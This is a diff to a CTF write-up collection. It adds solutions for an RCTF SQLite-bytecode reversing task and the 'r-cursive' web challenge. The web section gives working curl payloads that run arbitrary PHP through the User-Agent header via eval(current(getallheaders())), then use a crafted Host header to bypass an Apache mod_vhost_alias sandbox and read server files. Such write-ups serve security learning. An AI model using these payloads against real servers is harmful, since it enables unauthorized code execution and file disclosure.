@@ -78,11 +78,9 @@ After solving the PoW:
      <o>       \o       \         /         o         <o>          
       |         v\       o       o         <|          |           
      / \         <\      <\__ __/>         / \        / \          
-​                                                                   
     In every round of the game, I'll choose some different numbers from the figure interval. You are required to guess those numbers,ofc so does the order of them.
     On each surmise of yours, 2 numbers will be told as a hint for you, but you need to speculate the fuctions of these 2 figures. (XD
     GLHF
-                                                                   
     ================== round 1 ================== 
     Give me 4 numbers, in[0, 10), You can only try 6 times
 
@@ -107,11 +105,11 @@ I added socket interaction and the PoW solver to make it automated. After lettin
 
 Mostly hopeless, I looked at the correct solutions it got to the few rounds it managed. Interestingly enough, among all the correct solutions, there was never a sequence with duplicate numbers! So, I removed these sequences from the initial pool and made the initial guess to always be `[0, 1, 2, 3]`.
 
+([full script here](scripts/number-game-solver.py))
+
 With this modification the results were immediately better and in just a couple of attempts the flag was obtained!
 
 `RCTF{0lD_GaM3_nAmed_Bu11s_4nd_C0ws}`
-
-([full script here](scripts/number-game-solver.py))
 
 ## 52 Misc / git ##
 
@@ -408,7 +406,7 @@ After compiling, we can execute `neko exploit.n remote`, and with that we get:
 
 **Description**
 
-> right time, right spell, right flag. 
+> right time, right spell, right flag.
 > 
 > attachment: https://drive.google.com/open?id=13Di0J0NeDw6CeQ8W4wqKyLpx0vFtKZM0 
 
@@ -1402,7 +1400,7 @@ print "".join(flag)
 
 > Please submit RCTF{\<WhatYouInput\>}.
 > 
-> attachment: 
+> attachment:
 > 
 > https://drive.google.com/open?id=1p3afjvuSfSYwmqaiEDDpJUcU0VhGJ8AT 
 
@@ -1917,6 +1915,56 @@ And the flag is:
 
 So I was right about the guess, `echn` matched exactly, but I did not think of `!` as a replacement for the letter `i`. Annoying, but we got the flag so oh well!
 
+## 338 Reverse / sql ##
+
+**Description**
+
+> the format of flag is flag{.+}
+> 
+> attachment: https://drive.google.com/open?id=1TDWJWb2diPO_TDTHbZvuLWlsTV1LhoAs 
+
+**Solution**
+
+We were given a copy of a `sqlite3` terminal session, where the user typed `explain [some query]`, which produced the detailed SQLite VM bytecode. We don't know what the query is, and it seems the VM bytecode is more compressed than usual, since for my `sqlite3` it looked like:
+
+    sqlite> explain select 1;
+    addr  opcode         p1    p2    p3    p4             p5  comment      
+    ----  -------------  ----  ----  ----  -------------  --  -------------
+    0     Init           0     1     0                    00  Start at 1   
+    1     Integer        1     1     0                    00  r[1]=1       
+    2     ResultRow      1     1     0                    00  output=r[1]  
+    3     Halt           0     0     0                    00
+
+So the challenge doesn't include the comments column, but other than that all the information is present. The above is useful to check which column represents what.
+
+My first idea was to test some queries directly in `sqlite3` and refine them until the trace matches the one provided. But since the trace contains so many calls to `substr(3)` I figured the flag is probably matched character by character in a shuffled order, so this would probably take too long.
+
+So the approach was to write a simple VM to emulate the opcodes that we actually need, and see what conditional checks are being executed to extract what the flag has to be to pass those checks. There is [an online reference of SQLite3 bytecodes](https://sqlite.org/opcode.html) - very useful for this challenge of course. It also explains the VM well enough to write a super simple implementation.
+
+It was enough to implement these opcodes:
+
+ - `Column`
+ - `Function`
+ - `Eq`
+ - `Goto`
+ - `Integer`
+ - `Ne`
+ - `OpenRead`
+ - `Rewind`
+ - `String8`
+ - `TableLock`
+ - `Trace`
+ - `Transaction`
+ - `VerifyCookie`
+
+And even some of these were basically no-ops. One additional piece of information was used to solve the problem: all the conditional `Ne` checks in the query jumped to instruction 90, which immediately halted the machine. So as soon as there is a character mismatch, the query failed. Therefore, we know that these checks need to have operands that are equal to one another. As it turns out, they were always a single character string, and a single character substring of the flag.
+
+([full sqlite mini-VM](scripts/sql/Main.hx))
+
+And with that:
+
+`flag{lqs_rof_galf_esrever_a}`
+
 ## 444 Reverse / babyre2 ###
 
 **Description**
@@ -2188,3 +2236,117 @@ These would take too long to brute-force (2^64-ish possibilities for each entry 
 And after decoding:
 
 `flag{stay_prime_stay_invertible_away_from_bruteforce}`
+
+## 500 Web / r-cursive ###
+
+**Description**
+
+> LUL dat font
+> 
+> http://r-cursive.ml
+> 
+> hint: If you get stuck after arbitary code execution, try to escape the sandbox. phpinfo may help you figure out how the sandbox works.
+
+**Solution**
+
+After disabling the front-end font security (!), the page presents us with its source code:
+
+    <?php
+    $token = sha1($_SERVER['REMOTE_ADDR']);
+    $dir = '../sandbox/'.$token.'/';
+    is_dir($dir) ?: mkdir($dir);
+    is_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));
+    switch($_GET['action'] ?: ''){
+        case 'go':
+            header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');
+            break;
+        case 'reset':
+            system('rm -rf '.$dir);
+            break;
+        default:
+            show_source(__FILE__);
+    }
+    ?>
+    <style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>
+
+We can also look at the `template` file:
+
+    <?php
+    sha1($_SERVER['REMOTE_ADDR']) === '#SHA1#' ?: die();
+    ';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
+
+So this just seems to be a session management of some sort, only allowing access to subdomains whose name matches the hash of your IP address. Fair enough, let's create a session / subdomain with `http://r-cursive.ml?action=go`. Now at `http://<token>.sandbox.r-cursive.ml/` we are presented with exactly the same source code as in `template` above, but with the hash inserted.
+
+There is an `eval`! But we need to provide the argument / code for it to run via the `cmd` GET parameter. And before `eval` is executed, the parameter is checked - it has to match the regular expression:
+
+    /[^\W_]+\((?R)?\)/
+
+The first part, `[^\W_]+` is easy enough to understand - basically we can use simple functions with names consisting of `[A-Za-z0-9]` (not the underscore though). The `(?R)?` bit in parentheses was new to me, but `(?R)` simply means "repeat the whole pattern", and `?` makes it optional. So it is a recursive regular expression, which can match strings like `a()`, `something(else())`, `etc(etc(etc()))`. So `preg_replace` replaces these strings with the empty string, and the result of this must match `;`. So, to do some basic information gathering:
+
+    http://<token>.sandbox.r-cursive.ml:1337/?cmd=phpinfo();
+
+From the resulting page (as well as more involved commands perhaps), we can summarise:
+
+ - `open_basedir=/var/www/sandbox/<token>/:/tmp/` - we can only access our current directory and `/tmp`; this applies to basically all PHP functions that we might want to use, e.g. `fopen`, `file_get_contents`, `include`, etc
+ - `disable_functions=system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link` - everything useful is disabled, including environmental variable setting and mail (which would enable us to run arbitrary binaries via `LD_PRELOAD` and upload to `/tmp`)
+ - `disable_classes` - also lists some useful classes, not that important
+ - `auto_prepend_file=/var/www/sandbox/init.php` - interesting
+ - Apache 2 loaded modules: `core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php5 mod_reqtimeout mod_rewrite mod_setenvif mod_status mod_vhost_alias` - also interesting
+
+The last two points are worth investigating in greater detail. But first, the hint on the challenge said we should first get arbitrary code execution. We can only execute functions applied to results of functions, or functions that take no arguments. This is not terribly useful, we need to find a way to provide additional input and execute that.
+
+Clearly `eval` is enabled, but what do we evaluate? [`getallheaders`](https://php.net/manual/en/function.getallheaders.php) is a useful function enabled on Apache servers. It returns an array of all of the request headers, which we can modify of course. However, if an array is cast to a string in PHP, it just turns into `"Array"`, so we can't pass this directly to `eval`. Something like `array_pop` would be useful, but remember - the regular expression disallows underscores. In the [same section](http://php.net/manual/en/ref.array.php), however, we can find [`current`](http://php.net/manual/en/function.current.php) which "returns the current element in an array". Luckily enough, the current element of an array is the first element by default, unless we iterate it somehow. And so:
+
+    $ curl -A "echo 'hello world';" "http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+
+This prints out `hello world` as expected and clearly that `echo` command is not of the recursive regular expression form. So we have arbitrary code execution!
+
+Now let's think about how to "escape the sandbox". If we are believe that the homepage at `http://r-cursive.ml/` showed us its full source code, then our custom subdomain was created just by creating a directory in `/var/www/sandbox` and putting an `index.php` into it! Normally to configure a subdomain like this in Apache requires a `VirtualHost` directive in the configuration and reloading the server, but this was clearly not done.
+
+But, from `phpinfo();`, we found out that the module [`mod_vhost_alias`](https://httpd.apache.org/docs/2.2/mod/mod_vhost_alias.html) is loaded. It allows a wildcard virtual host to be defined, then determine the correct document root to use for each virtual host based on ... the `Host` header provided by us. Naturally we control this header as well, although we still need to make sure we match the alias.
+
+We can poke around a bit:
+
+    $ curl -H "Host: <token>.sandbox.r-cursive.ml" -A "echo getcwd();" "http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+    $ curl -H "Host: <token>.r-cursive.ml" -A "echo getcwd();" "http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+    $ curl -H "Host: <token>.ml" -A "echo getcwd();" "http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+    $ curl -H "Host: <token>" -A "echo getcwd();" "http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+    $ curl -H "Host: <token>.whatever.com" -A "echo getcwd();" "http://<token>.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+
+All of the above output the exact same thing, and it is our custom directory. This means that the directory to use is determined solely on the first part of the `Host` header. The fact that we are providing our URL might be confusing, but in fact `curl` only uses this to do DNS lookup. The `-H` overrides the header `curl` would normally send. This also works:
+
+    $ curl -H "Host: <token>" -A "echo getcwd();" "http://x.sandbox.r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+
+Now our custom token is only present in the `Host` header. Even this works:
+
+    $ curl -H "Host: <token>" -A "echo getcwd();" "http://r-cursive.ml:1337/?cmd=eval(current(getallheaders()));"
+
+In fact, the homepage and the custom userpages are hosted at the same IP, but the userpages are on port 1337. So with that we can guess that somewhere in Apache configuration, there is a bit like this:
+
+    <VirtualHost *:1337>
+      ServerAlias *
+      php_admin_value auto_prepend_file "/var/www/sandbox/init.php" 
+      VirtualDocumentRoot /var/www/sandbox/%1
+    </VirtualHost>
+
+Where `%1` refers to the first part of the `Host` header. Then `init.php` sets the `open_basedir` setting to the CWD (+ `/tmp/`). How can we abuse this? We would like to see the source of `init.php`. For that we need `open_basedir` to include `/var/www/sandbox`. Well, in Linux the path `/var/www/sandbox//` is the same as `/var/www/sandbox`. How can we make the path be empty? Playing around with the `Host` header, a lot of ideas get rejected by the server sending us `400 Bad Request`. Curiously enough, a leading dot `.` is allowed, so we can provide `Host: .a` as our custom header.
+
+    $ curl -H "Host: .a" "http://r-cursive.ml:1337/"
+
+This now says `403 Forbidden`! But this:
+
+    $ curl -H "Host: .a" "http://r-cursive.ml:1337/init.php"
+
+Does not say anything. The request goes through and we load the file `init.php`, but it doesn't print anything. Well, we are now in `/var/www/sandbox` - we can get back to our home directory:
+
+    $ curl -H "Host: .a" "http://r-cursive.ml:1337/<token>/?cmd=phpinfo();"
+
+Now `open_basedir` is `/var/www/sandbox:/tmp`. So, finally:
+
+    $ curl -H "Host: .a" -A "show_source('../init.php');" "http://r-cursive.ml:1337/<token>/?cmd=eval(current(getallheaders()));"
+
+curl -H "Host: .a" -A "show_source('../init.php');" "http://r-cursive.ml:1337/10e26884e4422841c514db060318ecc879ed9a24/?cmd=eval(current(getallheaders()));"
+
+It works!
+
+`RCTF{apache_mod_vhost_alias_should_be_configured_correctly}`
